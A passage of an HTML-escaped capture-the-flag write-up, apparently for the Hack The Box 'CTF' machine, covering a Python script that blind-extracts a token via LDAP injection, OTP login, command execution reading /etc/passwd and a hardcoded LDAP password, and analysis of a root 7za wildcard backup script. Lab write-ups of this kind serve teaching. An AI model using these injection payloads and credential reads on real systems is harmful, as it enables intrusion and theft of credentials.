		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%29%28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;D&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%29%29%28%7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pager&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;D{}{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Extracting Token&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Status : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Done !&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Token : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ctf/8.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-took-some-minutes-to-finish-and-now-we-have-the-token-&quot;&gt;It took some minutes to finish and now we have the token :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;285449490011357156531651545652335570713167411445727140604172141456711102716717000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-installed-stoken-apt-get-install-stoken-then-i-imported-the-token-&quot;&gt;I installed &lt;a href=&quot;https://github.com/cernekee/stoken&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stoken&lt;/code&gt;&lt;/a&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install stoken&lt;/code&gt;), Then I imported the token :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stoken import --token 285449490011357156531651545652335570713167411445727140604172141456711102716717000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-didnt-type-any-password-i-left-it-blank-we-can-either-use-the-cli-or-the-gui-for-the-cli-you-have-to-start-stoken-and-enter-the-pin-then-you-will-get-the-otp-and-for-another-otp-youll-need-to-start-stoken-again&quot;&gt;I didn’t type any password I left it blank. We can either use the &lt;code class=&quot;highlighter-rouge&quot;&gt;cli&lt;/code&gt; or the &lt;code class=&quot;highlighter-rouge&quot;&gt;gui&lt;/code&gt;, for the &lt;code class=&quot;highlighter-rouge&quot;&gt;cli&lt;/code&gt; you have to start &lt;code class=&quot;highlighter-rouge&quot;&gt;stoken&lt;/code&gt; and enter the pin then you will get the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;, and for another &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; you’ll need to start &lt;code class=&quot;highlighter-rouge&quot;&gt;stoken&lt;/code&gt; again.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-just-used-the-gui-as-its-better-&quot;&gt;So I just used the &lt;code class=&quot;highlighter-rouge&quot;&gt;gui&lt;/code&gt; as it’s better :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;rce-user-flag&quot;&gt;RCE, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;lets-login-and-see-whats-there-&quot;&gt;Let’s login and see what’s there :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;2a2928uid3d2a2929287c28uid3d2a-is-uiduid-url-encoded&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%2a%29%28uid%3d%2a%29%29%28%7c%28uid%3d%2a&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(uid=*&lt;/code&gt; url-encoded.&lt;/h4&gt;
&lt;h4 id=&quot;it-redirected-me-to-pagephp-which-i-can-use-to-execute-commands-&quot;&gt;It redirected me to &lt;code class=&quot;highlighter-rouge&quot;&gt;/page.php&lt;/code&gt; which I can use to execute commands :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-whoami-and-it-worked-fine&quot;&gt;I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; and it worked fine:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-switched-to-burp-to-make-things-easier-i-wanted-to-read-etcpasswd-to-know-the-users-&quot;&gt;I switched to burp to make things easier, I wanted to read &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; to know the users :&lt;/h4&gt;
&lt;h4 id=&quot;request--1&quot;&gt;Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /page.php HTTP/1.1
Host: ctf.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.htb/page.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Cookie: PHPSESSID=jj0dlekfhl2pggbo50bg4dkeu0
Connection: close
Upgrade-Insecure-Requests: 1

inputCmd=cat /etc/passwd&amp;amp;inputOTP=52447058

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 21:58:13 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 4005
Connection: close
Content-Type: text/html; charset=UTF-8

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        ----------------
         Removed Output
        ----------------
&lt;span class=&quot;nt&quot;&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
libstoragemgmt:x:998:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
ldap:x:55:55:OpenLDAP server:/var/lib/ldap:/sbin/nologin
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
ldapuser:x:1000:1000::/home/ldapuser:/bin/bash
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
        ----------------
         Removed Output
        ----------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-see-that-ldapuser-is-an-actual-user-on-the-box-i-tried-to-get-a-reverse-shell-but-for-some-reason-i-couldnt-get-a-reverse-shell-at-all-so-i-started-to-look-in-the-web-files-i-was-already-in-the-web-directory-&quot;&gt;We can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt; is an actual user on the box, I tried to get a reverse shell but for some reason I couldn’t get a reverse shell at all so I started to look in the web files. I was already in the web directory :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=pwd&amp;amp;inputOTP=14546713

/var/www/html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-listed-the-files-&quot;&gt;I listed the files :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=ls -la&amp;amp;inputOTP=14546713

total 36
drwxr-xr-x. 6 root   root    176 Oct 23  2018 .
drwxr-xr-x. 4 root   root     33 Jun 27  2018 ..
-rw-r--r--. 1 root   root      0 Jul 20 00:03 banned.txt
-rw-r-----. 1 root   apache 1424 Oct 23  2018 cover.css
drwxr-x--x. 2 root   apache 4096 Oct 23  2018 css
drwxr-x--x. 4 root   apache   27 Oct 23  2018 dist
-rw-r-----. 1 root   apache 2592 Oct 23  2018 index.html
drwxr-x--x. 2 root   apache  242 Oct 23  2018 js
-rw-r-----. 1 root   apache 5021 Oct 23  2018 login.php
-rw-r-----. 1 root   apache   68 Oct 23  2018 logout.php
-rw-r-----. 1 root   apache 5245 Oct 23  2018 page.php
-rw-r-----. 1 root   apache 2324 Oct 23  2018 status.php
drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-started-looking-for-any-hardcoded-credentials-in-the-php-files-in-loginphp-i-found-credentials-for-ldapuser-&quot;&gt;I started looking for any hardcoded credentials in the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files, in &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php&lt;/code&gt; I found credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=cat login.php&amp;amp;inputOTP=04181897

&amp;lt;?php
session_start();
$strErrorMsg=&quot;&quot;;

$username = 'ldapuser';
$password = 'e398e27d5c4ad45086fe431120932a01';

$basedn = 'dc=ctf,dc=htb';
$usersdn = 'cn=users';

// This code uses the START_TLS command

$ldaphost = &quot;ldap://ctf.htb&quot;;
$ldapUsername  = &quot;cn=$username&quot;;

$ds = ldap_connect($ldaphost);
$dn = &quot;uid=ldapuser,ou=People,dc=ctf,dc=htb&quot;;

if (!empty($_POST))
{
    //var_dump($_POST);
    $username1 = $_POST['inputUsername'];
    $OPT1 = $_POST['inputOTP'];

    $regex='/[()*&amp;amp;|!=&amp;gt;&amp;lt;~]/';

    if (!preg_match($regex, $username1)) {
        $username2 = urldecode($username1);

        if(!ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3)){
            print &quot;Could not set LDAPv3\r\n&quot;;
        }
        else if (!ldap_start_tls($ds)) {
           print &quot;Could not start secure TLS connection&quot;;
        }
        else {
            // now we need to bind to the ldap server
            $bth = ldap_bind($ds, $dn, $password) or die(&quot;\r\nCould not connect to LDAP server\r\n&quot;);

            $filter = &quot;(&amp;amp;(objectClass=inetOrgPerson)(uid=$username2))&quot;;
            // fix to be sure that the user has a token string in the db. Without it you can bypass the OTP check with no token in the input form!
            $filter = &quot;(&amp;amp;(&amp;amp;(objectClass=inetOrgPerson)(uid=$username2))(pager=*))&quot;;
            //echo $filter.PHP_EOL;
            if ($search=@ldap_search($ds, $basedn, $filter)) {
                $info = ldap_get_entries($ds, $search);

                if($info[&quot;count&quot;] &amp;gt; 0) {
                    $token_string = $info[0]['pager'][0];
                    //echo $token_string;
                    $token = exec(&quot;/usr/bin/stoken --token=$token_string --pin=0000&quot;);
                    if($token == $OPT1) {
                        $strErrorMsg = &quot;Login ok&quot;;
                        $_SESSION['username'] = $username1;
                        header ('Location: /page.php');
                    }
                    else {
                        $strErrorMsg = &quot;Cannot login&quot;;
                    }
                }
                else {
                    $strErrorMsg = &quot;User $username1 not found&quot;;
                }
            }
        }
    }
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;-ldapuser--e398e27d5c4ad45086fe431120932a01&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt; ldapuser : e398e27d5c4ad45086fe431120932a01&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;ssh-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;7z-list-files-and-wildcards-root-flag&quot;&gt;7z List Files and Wildcards, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;before-enumerating-anything-i-just-checked-the-directories-and-stuff-like-that-in--i-saw-a-directory-called-backup&quot;&gt;Before enumerating anything I just checked the directories and stuff like that, in &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; I saw a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf /]$ ls -al
total 32
dr-xr-xr-x.  18 root root  238 Jul 31  2018 .
dr-xr-xr-x.  18 root root  238 Jul 31  2018 ..
drwxr-xr-x.   2 root root 4096 Jul 20 00:07 backup
lrwxrwxrwx.   1 root root    7 Jul 30  2018 bin -&amp;gt; usr/bin
dr-xr-xr-x.   5 root root 4096 Oct 16  2018 boot
drwxr-xr-x.  20 root root 3180 Jul 19 23:34 dev
drwxr-xr-x.  90 root root 8192 Dec  9  2018 etc
drwxr-xr-x.   3 root root   22 Jul 30  2018 home
lrwxrwxrwx.   1 root root    7 Jul 30  2018 lib -&amp;gt; usr/lib
lrwxrwxrwx.   1 root root    9 Jul 30  2018 lib64 -&amp;gt; usr/lib64
drwxr-xr-x.   2 root root    6 Apr 11  2018 media
drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
drwxr-xr-x.   3 root root   16 Jul 30  2018 opt
dr-xr-xr-x. 119 root root    0 Jul 19 23:33 proc
dr-xr-x---.   7 root root 4096 Dec  9  2018 root
drwxr-xr-x.  31 root root  920 Jul 19 23:34 run
lrwxrwxrwx.   1 root root    8 Jul 30  2018 sbin -&amp;gt; usr/sbin
drwxr-xr-x.   2 root root    6 Apr 11  2018 srv
dr-xr-xr-x.  13 root root    0 Jul 19 23:34 sys
drwxrwxrwt.  10 root root 4096 Jul 20 00:06 tmp
drwxr-xr-x.  13 root root  155 Jul 30  2018 usr
drwxr-xr-x.  21 root root 4096 Jul 30  2018 var
[ldapuser@ctf /]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-had-a-lot-of-archives-an-error-log-and-a-script-called-honeypotsh-&quot;&gt;It had a lot of archives, an error log and a script called &lt;code class=&quot;highlighter-rouge&quot;&gt;honeypot.sh&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf backup]$ ls -al
total 52
drwxr-xr-x.  2 root root 4096 Jul 20 00:07 .
dr-xr-xr-x. 18 root root  238 Jul 31  2018 ..
-rw-r--r--.  1 root root   32 Jul 19 23:57 backup.1563573421.zip
-rw-r--r--.  1 root root   32 Jul 19 23:58 backup.1563573481.zip
-rw-r--r--.  1 root root   32 Jul 19 23:59 backup.1563573541.zip
-rw-r--r--.  1 root root   32 Jul 20 00:00 backup.1563573602.zip
-rw-r--r--.  1 root root   32 Jul 20 00:01 backup.1563573661.zip
-rw-r--r--.  1 root root   32 Jul 20 00:02 backup.1563573721.zip
-rw-r--r--.  1 root root   32 Jul 20 00:03 backup.1563573781.zip
-rw-r--r--.  1 root root   32 Jul 20 00:04 backup.1563573841.zip
-rw-r--r--.  1 root root   32 Jul 20 00:05 backup.1563573901.zip
-rw-r--r--.  1 root root   32 Jul 20 00:06 backup.1563573961.zip
-rw-r--r--.  1 root root   32 Jul 20 00:07 backup.1563574022.zip
-rw-r--r--.  1 root root    0 Jul 20 00:07 error.log
-rwxr--r--.  1 root root  975 Oct 23  2018 honeypot.sh
[ldapuser@ctf backup]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;honeypotsh-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;honeypot.sh&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf backup]$ cat honeypot.sh 
# get banned ips from fail2ban jails and update banned.txt
# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u &amp;gt; /var/www/html/banned.txt
# awk '$1=$1' ORS='&amp;lt;br&amp;gt;' /var/www/html/banned.txt &amp;gt; /var/www/html/testfile.tmp &amp;amp;&amp;amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt

# some vars in order to be sure that backups are protected
now=$(date +&quot;%s&quot;)
filename=&quot;backup.$now&quot;
pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')

# keep only last 10 backups
cd /backup
ls -1t *.zip | tail -n +11 | xargs rm -f

# get the files from the honeypot and backup 'em all
cd /var/www/html/uploads
7za a /backup/$filename.zip -t7z -snl -p$pass -- *

# cleaup the honeypot
rm -rf -- *

# comment the next line to get errors for debugging
truncate -s 0 /backup/error.log
[ldapuser@ctf backup]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;obviously-this-script-runs-from-time-to-time-to-backup-files-also-its-running-as-root-i-didnt-check-cronjobs-or-use-pspy-it-was-obvious-since-its-accessing-rootroottxt-to-create-the-password-and-only-root-can-access-that&quot;&gt;Obviously this script runs from time to time to backup files, also it’s running as root. I didn’t check cronjobs or use &lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt;, it was obvious since it’s accessing &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; to create the password and only root can access that.&lt;/h4&gt;
&lt;h4 id=&quot;basically-one-of-the-things-that-this-script-is-doing-is-that-its-backing-up-all-the-files-in-varwwwhtmluploads-by-using-7za-to-put-all-the-uploads-in-one-archive-lets-look-at-the-command-again-&quot;&gt;Basically one of the things that this script is doing is that it’s backing up all the files in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; by using &lt;code class=&quot;highlighter-rouge&quot;&gt;7za&lt;/code&gt; to put all the uploads in one archive. Let’s look at the command again :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;7za a /backup/$filename.zip -t7z -snl -p$pass -- *&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-using-the-wildcard-asterisk--to-get-all-files-this-means-that-if-we-can-write-to-varwwwhtmluploads-our-file-will-be-included-in-the-command-if-we-can-create-a-malicious-file-name-then-we-can-somehow-manipulate-the-7za-command&quot;&gt;It’s using the wildcard asterisk (&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;) to get all files. This means that if we can write to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; our file will be included in the command. If we can create a malicious file name then we can somehow manipulate the &lt;code class=&quot;highlighter-rouge&quot;&gt;7za&lt;/code&gt; command.&lt;/h4&gt;
&lt;h4 id=&quot;its-also-using-this-option---snl-i-checked-the-manual-page-for-7za-&quot;&gt;It’s also using this option : &lt;code class=&quot;highlighter-rouge&quot;&gt;-snl&lt;/code&gt;, I checked the manual page for &lt;code class=&quot;highlighter-rouge&quot;&gt;7za&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;       -snl   Store symbolic links as links
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
